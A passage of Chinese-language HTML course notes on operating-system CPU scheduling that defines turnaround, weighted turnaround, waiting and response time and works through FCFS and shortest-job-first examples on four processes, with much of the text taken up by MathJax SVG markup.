周转时间</h4><p>周转时间：从作业被提交给系统开始，到作业完成为止的这段时间间隔。</p><p>它包括四个部分：</p><ul><li>作业在外存后备队列上等待作业调度（高级调度）的时间</li><li>进程在就绪队列上等待进程调度（低级调度）的时间</li><li>进程在CPU上执行的时间</li><li>进程等待I/O操作完成的时间</li></ul><p>后三项在一个作业的整个处理过程中，可能发生多次。</p><p>对于用户来说，更关心自己的单个作业的周转时间：</p><script type="math/tex; mode=display">周转时间 = 作业完成时间 - 作业提交时间</script><p>对于操作系统来说，更关心系统的整体表现，因此更关心所有作业周转时间的平均值：</p><script type="math/tex; mode=display">平均周转时间 = \frac{各作业周转时间之和}{作业数}</script><p>对于周转时间相同的两个作业，实际运行时间长的作业在相同时间内被服务的时间更多，带权周转时间更小，用户满意度更高：</p><script type="math/tex; mode=display">带权周转时间 = \frac{周转时间}{作业实际运行的时间} = \frac{作业完成时间 - 作业提交时间}{作业实际运行的时间}</script><p>平均带权周转时间：</p><script type="math/tex; mode=display">平均带权周转时间 = \frac{各作业带权周转时间之和}{作业数}</script><h4 id="2-8-6-4-等待时间"><a href="#2-8-6-4-等待时间" class="headerlink" title="2.8.6.4 等待时间"></a>2.8.6.4 等待时间</h4><p>计算机的用户希望自己的作业尽可能少的等待处理机。</p><p>等待时间：指进程/作业处于等待处理机状态时间之和，等待时间越长，用户满意度越低。</p><p>对于进程来说，等待时间就是指进程建立后等待被服务的时间之和，在等待I/O完成的期间其实进程也是在被服务的，所以不计入等待时间。</p><p>对于作业来说，不仅要考虑建立进程后的等待时间，还要加上作业在外存后备队列中等待的时间。</p><p>一个作业总共需要被CPU服务多久，被I/O设备服务多久一般是确定不变的，因此调度算法其实只会影响作业/进程的等待时间。当然，与前面指标类似，也有“平均等待时间”来评价整体性能。</p><h4 id="2-8-6-5-响应时间"><a href="#2-8-6-5-响应时间" class="headerlink" title="2.8.6.5 响应时间"></a>2.8.6.5 响应时间</h4><p>对于计算机用户来说，会希望自己的提交的请求（比如通过键盘输入了一个调试命令）尽早地开始被系统服务、回应。</p><p>响应时间：指从用户提交请求到首次产生响应所用的时间。</p><h3 id="2-8-7-调度算法"><a href="#2-8-7-调度算法" class="headerlink" title="2.8.7 调度算法"></a>2.8.7 调度算法</h3><p>Tips：各种调度算法的学习思路</p><ol><li>算法思想</li><li>算法规则</li><li>这种调度算法是用于作业调度还是进程调度？</li><li>抢占式？非抢占式？</li><li>优点和缺点</li><li>是否会导致饥饿</li></ol><p>饥饿：某进程 / 作业长期得不到服务。</p><h4 id="2-8-7-1-FCFS-先来先服务"><a href="#2-8-7-1-FCFS-先来先服务" class="headerlink" title="2.8.7.1 FCFS(先来先服务)"></a>2.8.7.1 FCFS(先来先服务)</h4><p>算法思想：主要从“公平”的角度考虑</p><p>算法规则：按照作业 / 进程到达的先后顺序进行服务</p><p>用于作业 / 进程调度：用于作业调度时，考虑的是哪个作业先到达后备队列；用于进程调度时，考虑的是哪个进程先到达就绪队列</p><p>是否可抢占：非抢占式的算法</p><p>优点：公平、算法实现简单</p><p>缺点：排在长作业（进程）后面的短作业需要等待很长时间，带权周转时间很大，对短作业来说用户体验不好。即，FCFS算法对长作业有利，对短作业不利</p><p>是否会导致饥饿：不会产生饥饿现象</p><p>例：各进程到达就绪队列的时间、需要的运行时间如下表所示。使用FCFS调度算法，计算各进程的等待时间、平均等待时间、周转时间、平均周转时间、带权周转时间、平均带权周转时间。</p><div class="table-container"><table><thead><tr><th>进程</th><th>到达时间</th><th>运行时间</th></tr></thead><tbody><tr><td>P1</td><td>0</td><td>7</td></tr><tr><td>P2</td><td>2</td><td>4</td></tr><tr><td>P3</td><td>4</td><td>1</td></tr><tr><td>P4</td><td>5</td><td>4</td></tr></tbody></table></div><p>FCFS，所以调度顺序为：P1-&gt;P2-&gt;P3-&gt;P4</p><p>周转时间 = 作业完成时间 - 作业提交(到达)时间</p><script type="math/tex; mode=display">P1=7-0=7\\\\P2=(7+4) - 2=9\\\\P3=(7+4+1)-4=8\\\\P4=(7+4+1+4)-5=11</script><p>平均周转时间 = 周转时间之和 / 作业数</p><script type="math/tex; mode=display">平均周转时间 = \frac{7+9+8+11}{4}=8.75</script><p>带权周转时间 = 周转时间 / 作业实际运行的时间</p><script type="math/tex; mode=display">P1=\frac{7}{7} =1\\\\P2=\frac{9}{4}=2.25\\\\P3=\frac{8}{1}=8\\\\P4=\frac{11}{4}=2.75</script><p>平均带权周转时间 = 带权周转时间之和 / 作业数</p><script type="math/tex; mode=display">平均带权周转时间 = \frac{1+2.25+8+2.75}4=3.5</script><p>等待时间 = 周转时间 - 运行时间 - I/O操作的时间(这里为0)</p><script type="math/tex; mode=display">P1=7-7=0\\\\P2=9-4=5\\\\P3=8-1=7\\\\P4=11-4=7</script><p>平均等待时间 = 总等待时间 / 作业数</p><script type="math/tex; mode=display">平均等待时间 = \frac{0+5+7+7}{4}=4.75</script><h4 id="2-8-7-2-SJF-短作业优先"><a href="#2-8-7-2-SJF-短作业优先" class="headerlink" title="2.8.7.2 SJF(短作业优先)"></a>2.8.7.2 SJF(短作业优先)</h4><p>算法思想：追求最少的平均等待时间，最少的平均周转时间、最少的平均平均带权周转时间</p><p>算法规则：最短的作业 / 进程优先得到服务（所谓“最短”，是指要求服务时间最短）</p><p>用于作业 / 进程调度：即可用于作业调度，也可用于进程调度。用于进程调度时称为“短进程优先(SPF, Shortest Process First)算法”</p><p>是否可抢占：SJF和SPF是非抢占式的算法。但是也有抢占式的版本——最短剩余时间优先算法(SRTN, Shortest Remaining Time Next)</p><p>优点：“最短的”平均等待时间、平均周转时间</p><p>缺点：不公平。对短作业有利，对长作业不利。可能产生饥饿现象。另外，作业/进程的运行时间是由用户提供的，并不一定真实，不一定能做到真正的短作业优先</p><p>是否会导致饥饿：会产生饥饿现象。如果源源不断地有短作业/进程到来，可能使长作业/进程长时间得不到服务，产生“饥饿”现象。如果一直得不到服务，则称为“饿死”</p><p>例：例题同上，使用<strong>非抢占式</strong>的短作业优先算法。</p><p>短作业/进程优先调度算法：每次调度时选择<strong>当前已到达</strong>且<strong>运行时间最短</strong>的作业/进程。所以，调度顺序为：P1-&gt;P3-&gt;P2-&gt;P4</p><p>例：例题同上，使用<strong>抢占式</strong>的短作业优先算法。</p><p>最短剩余时间优先算法：每当有进程加入就绪队列改变时就需要调度，如果新到达的进程剩余时间比当前运行的进程剩余时间更短，则由新进程抢占处理机，当前运行进程重新回到就绪队列。另外，当一个进程完成时也需要调度。</p><p>需要注意的是，当有新进程到达时就绪队列就会改变，就要按照上述规则进行检查。以下<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="6.347ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2805.3 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(675,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1149.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1538.3,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(2416.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>表示当前<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="2.6ex" height="1.902ex" role="img" focusable="false" viewBox="0 -683 1149.3 840.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(675,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>进程剩余时间为m。各个时刻的情况如下：</p><p>0时刻(P1到达)：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="5.332ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2356.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(1467.6,0)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g><g data-mml-node="mo" transform="translate(1967.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p>2时刻(P2到达)：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="11.669ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 5157.8 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(1467.6,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g><g data-mml-node="mo" transform="translate(1967.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2356.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(2801.2,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(3879.8,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(4268.8,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mo" transform="translate(4768.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p>4时刻(P3到达)：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="18.007ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 7959 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(1467.6,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g><g data-mml-node="mo" transform="translate(1967.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2356.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(2801.2,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(3879.8,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(4268.8,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(4768.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5157.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(5602.4,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(6681,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(7070,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(7570,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p>5时刻(P3完成且P4到达)：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="18.007ex" height="2.262ex" 